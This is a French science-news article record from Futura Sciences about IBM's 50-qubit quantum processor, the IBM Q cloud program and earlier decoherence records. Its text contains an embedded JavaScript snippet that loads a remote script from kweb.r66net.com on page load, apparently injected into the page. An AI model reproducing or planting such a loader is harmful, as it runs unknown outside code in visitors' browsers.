{"title": "IBM progresse vers l'ordinateur quantique du futur", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "08/03/2017", "content": "IBM vient d'annoncer qu'un processeur quantique de 50 qubits avait été réalisé dans ses laboratoires et qu'un autre, de 20 qubits, serait prochainement à disposition de ses clients. 50 qubits, c'est peut-être le seuil à partir duquel certains calculs quantiques seraient plus rapides que d'autres réalisés sur ordinateurs classiques. Ce qu'il faut retenir IBM aurait réalisé un nouveau record en créant un circuit quantique supraconducteur utilisable pour faire du calcul quantique. Le circuit en question contient 50 qubits et serait capable de lutter victorieusement contre la décohérence pendant 90 microsecondes. Une version avec 20 qubits sera disponible pour les clients d'IBM d'ici la fin de l'année. Ces nouveaux hardwares le confirment : IBM s'est bien lancée dans la course aux ordinateurs quantiques. Big Blue pourrait bientôt apporter la preuve que ses machines ont atteint la suprématie quantique avec 50 qubits.  Interview : en quoi un ordinateur quantique est-il différent ?                       Le monde quantique est fascinant : à cette échelle, par exemple, les objets peuvent se trouver simultanément dans plusieurs états. Exploitant ce principe, un ordinateur quantique aurait des possibilités bien plus vastes qu’un modèle classique. Dans le cadre de sa série de vidéos Questions d’experts, sur la physique et l’astrophysique, l’éditeur De Boeck a interrogé Claude Aslangul, professeur à l’UPMC, afin qu'il nous explique le fonctionnement de cette étrange machine.                                       En mars 2017, la société  IBM  annonçait qu'elle pensait pouvoir construire, dans un avenir proche, un circuit quantique avec 50  qubits ... Nous pouvions légitimement en douter. En effet, depuis quelques années, de nombreux experts n'arrêtaient pas de répéter que le graal des  ordinateurs quantiques  était probablement inatteignable ou, pour le moins, qu'il allait falloir attendre des décennies. Or, avec un tel nombre de bits d'informations quantiques (que ceux-ci soient utilisés par un simulateur quantique limité à l'exécution d'un algorithme quantique bien précis ou sous forme d'un authentique ordinateur quantique programmable), nous devons, en théorie, pouvoir commencer à atteindre le territoire mythique de la  suprématie quantique . En clair, des supercalculateurs classiques commenceraient à être surpassés en vitesse dans l'exécution de certains calculs (aujourd'hui, les supercalculateurs classiques peuvent encore être capables de simuler le comportement du circuit quantique, quoique plus lentement). Il faudrait encore plus de qubits et, bien évidemment, disposer d'une solution au problème de la décohérence, par exemple avec des techniques de correction des erreurs, pour écraser les supercalculateurs classiques en résolvant des problèmes qui leur soient vraiment hors d'atteinte. Il ne faut pas oublier non plus que nous ne savons toujours pas s'il existe des algorithmes quantiques plus rapides qu'un algorithme classique pour résoudre un problème. Par ailleurs, nous avons déjà découvert des algorithmes classiques nouveaux permettant à des ordinateurs classiques de reprendre l'avantage avec la résolution de problèmes bien précis. Le cryostat du circuit quantique à 50 qubits. © IBM                       Un circuit quantique supraconducteur avec 50 qubits IBM vient de faire savoir qu'elle avait effectivement réussi à fabriquer un processeur quantique avec 50 qubits. L'entreprise va également mettre en ligne pour ses clients, avant la fin de l'année, une version de plus grande taille de 20 qubits fonctionnant comme un ordinateur quantique programmable. Le processeur de 50 qubits serait capable de résister à la décohérence pendant 90 microsecondes en moyenne et ses performances devraient être améliorées au cours de l'année 2018. C'est incontestablement un accomplissement remarquable, et qui vient plus tôt que prévu, ce qui autorise sans doute un optimisme mesuré.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Dans le cas de ses prédécesseurs avec moins de qubits (5 puis 16), il s'agissait de mettre à disposition de toutes les personnes suffisamment expertes en informatique et en physique un mini-ordinateur quantique dans le cadre du programme  IBM Q  (dont Futura avait déjà parlé dans l'article ci-dessous). Il s'agissait d'aider à créer et à explorer des softwares quantiques, révélant déjà leur potentiel avant que n'arrive le  hardware  des machines plus puissantes ; auparavant, seul un simulateur du circuit avec 20 qubits avait été mis en ligne dans le même but. Grâce à IBM Q, plus de 60.000 utilisateurs inscrits dans plus de 1.500 universités ont effectué leurs premières armes dans le domaine du calcul et de la programmation quantique, ce qui a généré plus de 35 publications. Big Blue continue donc de progresser vers l'ordinateur quantique du futur et entend bien le commercialiser pour ses  applications  possibles, talonné par  Google  et d'autres concurrents. Nous aimerions bien, tout de même, comme le physicien  Andrew Childs , grand spécialiste de l'informatique quantique, avoir une publication sous la main précisant ce qui a vraiment été accompli avec le circuit à 50 qubits... Pour en savoir plus IBM se lance pleinement dans la course à l'informatique quantique Article de Laurent Sacco publié le 08/03/2017 La société IBM vient de faire savoir qu'elle n'entendait pas rater la révolution des ordinateurs quantiques qu'elle espère imminente. Pour cela, elle lance un projet dont le but est d'aboutir à la mise en ligne sur le  cloud  du premier vrai ordinateur quantique avec applications commerciales et scientifiques. Si développer un software dans ce sens ne devrait pas poser de problème, on peut avoir des doutes pour le hardware. Comme le rappelle le physicien  Claude Aslangul  qui explique, dans la vidéo ci-dessus, les principes à la base des ordinateurs quantiques, les experts ont beaucoup de doutes en ce qui concerne la réalisation de ces machines. C'est également ce que nous avait confirmé le cosmologiste  Max Tegmark  dans l'interview qu'il avait accordé à Futura. Lors de cette interview, il nous avait rapporté que les experts qu'il avait consultés à ce sujet, dans le meilleur des cas, ne s'attendaient pas à des miracles avant 2050. Ce n'est pas que l'on ne sache pas faire des ordinateurs (universellement programmables) et des calculateurs quantiques : ils existent déjà, mais l'on ne sait toujours pas comment les faire passer du stade de curiosités de laboratoire aisément surpassées par une calculatrice programmable moderne à celui de machines capables de surpasser les plus puissants superordinateurs. Tout au plus arrive-t-on à produire des calculateurs quantiques en mesure d'effectuer un type d'algorithme bien précis, par exemple pour faire du recuit simulé, comme l'a montré la société  D - Wave  System . Il y a au moins deux verrous à faire sauter pour une révolution technologique basée sur les ordinateurs quantiques : Le premier est celui de la décohérence, dont on n'a toujours pas vraiment la solution, même en utilisant des codes correcteurs quantiques. Le second est qu'il faut disposer d'un suffisamment grand nombre de qubits, et ce avec une technique qui permet a priori de construire des machines de plus en plus puissantes à cet égard. Une présentation du potentiel des ordinateurs quantiques. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais devraient alors apparaître. Cliquez ensuite sur l'écrou à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». © IBM Research Un ordinateur quantique avec 50 qubits dans quelques années ? On a donc bien du mal à prendre au sérieux une partie de la dernière annonce faite par  IBM . La célèbre société vient en effet de faire savoir qu'elle se lançait officiellement dans la course à la construction du premier vrai ordinateur quantique universel commercial disponible en ligne via le  cloud  et un projet baptisé  IBM Q . Si rien n'interdit de développer dès aujourd'hui le software qui va avec ce projet, on ne peut qu'avoir des doutes quand IBM fait part des ses espoirs concernant le hardware. Celui-ci pourrait être disponible dans quelques années selon Big Blue, qui veut construire une machine avec environ 50 qubits. On sait que ce chiffre est avancé lorsque l'on parle au moins de simulateurs, et pas encore d'ordinateurs, en mesure, à l'aide du calcul quantique, de battre certains algorithmes classiques sur des superordinateurs, ce qui établirait ce que l'on appelle « la  suprématie quantique  ». Rappelons d'ailleurs au passage qu'il n'y aucune preuve qu'un algorithme quantique soit systématiquement plus performant qu'un algorithme classique, ce qui, en plus de la difficulté à construire des ordinateurs quantiques, pourrait bien vouloir dire que seuls certains problèmes seront plus efficacement et à moindre coût traités par des ordinateurs ou des simulateurs quantiques. Pour le moment, IBM continue d'explorer les possibilités ouvertes par son processeur quantique à 5 qubits supraconducteurs localisé au centre de recherche T. J. Watson, à New York, et mis à disposition de tout ordinateur ou appareil mobile  via  le  cloud  IBM  et la plateforme  IBM Quantum Experience . La société IBM est encouragée par les résultats déjà obtenus pour un  cloud  quantique, comme l'explique cette vidéo. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais devraient alors apparaître. Cliquez ensuite sur l'écrou à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». © IBM Research Une application pour processeurs quantiques sur le  cloud Encouragé par les résultats déjà obtenus, IBM vient donc de rendre disponible une application permettant aux développeurs et programmeurs de construire des interfaces entre un ordinateur classique et leur processeur sur le  cloud  sans qu'ils soient des experts en physique quantique. Big Blue vient également de mettre en ligne un simulateur de circuit quantique avec 20 qubits et annonce que, dans quelques mois, seront aussi disponibles pour les internautes les documents nécessaires pour leur permettre d'explorer les possibilités qu'ouvriront des simulations et les programmes avec un tel circuit.  Personne ne peut encore vraiment dire ce que l'avenir nous réserve avec les ordinateurs quantiques mais ce qui est sûr c'est que, depuis la mise en ligne du processeur d'IBM, environ 40.000 utilisateurs ont effectué plus de 275.000 expériences avec lui, dont des scientifiques dans plus de 100 pays qui ont déposé 15 articles sur  arXiv  avec cinq publiés dans des revues de premier plan. Le nouveau record d'IBM en informatique quantique Article de Laurent Sacco publié le 29/02/2012 Les chercheurs d'IBM ont établi un nouveau record : le plus long temps de décohérence dans un circuit d'ordinateur quantique. L'exploit n'est pas mince : si un jour ce temps s'allonge suffisamment pour un nombre de « qubits » assez grand, une nouvelle ère technologique s'ouvrira. Les bits d'information des  ordinateurs  classiques sont simplement des nombres binaires que l'on peut manipuler selon des principes en partie établis par les travaux d' Alan Turing . Mais avec des qubits d'informations, des états de machine qui sont des superpositions de « 0 » et de « 1 », des calculs en parallèle d'une très grande puissance et d'une très grande rapidité deviennent possibles, brisant les limites physiques des ordinateurs basées sur les lois de la physique classique. Avec une telle information quantique, 250 qubits suffiraient pour faire des calculs nécessitant d'enregistrer un bit d'information classique par atome présent dans l'univers observable. L'un des tout premiers chercheurs qui a exploré les possibilités offertes par des  ordinateurs quantiques  fut le prix Nobel de physique  Richard Feynman . La cavité micro-onde en cuivre ouverte avec, en noir sur une surface translucide, le circuit supraconducteur portant un qubit. Un  inch  (pouce) vaut 2,54 cm. © IBM Research                               On a déjà réalisé des ordinateurs quantiques mais leur puissance reste très faible car n'importe quelle calculatrice programmable des années 1970 les battrait aisément. Pour réellement concurrencer des machines comme le  Curie , le supercalculateur de Bull à 2 pétaflops, il faut un assez grand nombre de qubits. Des qubits avec jonctions Josephson supraconductrices Malheureusement, cela veut dire qu'il faut exorciser le démon de la  décohérence  dont on sait qu'il intervient pour résoudre le paradoxe du  chat de Schrödinger . IBM  vient d'annoncer que ses ingénieurs avaient réussi à défier le démon et à le battre partiellement en utilisant, entre autres, un dispositif exploitant le phénomène de la  supraconductivité . La porte logique quantique utilisée dans le circuit supraconducteur 2D des chercheurs d'IBM. © IBM Research                               Une jonction Josephson a ainsi été suspendue dans une cavité micro-onde et ce  circuit supraconducteur  qualifié de 3D a permis d'atteindre un temps de résistance à la décohérence de 100 microsecondes, ce qui améliore les résultats précédemment obtenus d'un facteur de 2 à 4 selon les chercheurs d'IBM.  Un autre dispositif  supraconducteur , qualifié lui de 2D, a été réalisé avec une puce et le temps de résistance à la décohérence a été cette fois de 10 microsecondes. Ces éléments n'ont pas été choisis au hasard car ils devraient pouvoir être multipliés à grande échelle dans le futur. Si notre conscience repose sur des processus de traitement de l'information quantiques, peut-être, d'ici quelques dizaines d'années, l'équivalent de la  puce synaptique  d'IBM (devenue quantique) permettra-t-elle de réaliser le rêve d'Alan Turing, à savoir de la conscience artificielle. Toutefois, pour beaucoup, exorciser définitivement le démon de la décohérence quantique tiendrait du miracle. On verra bien... peut-être vers 2045. ", "theme": "tech"}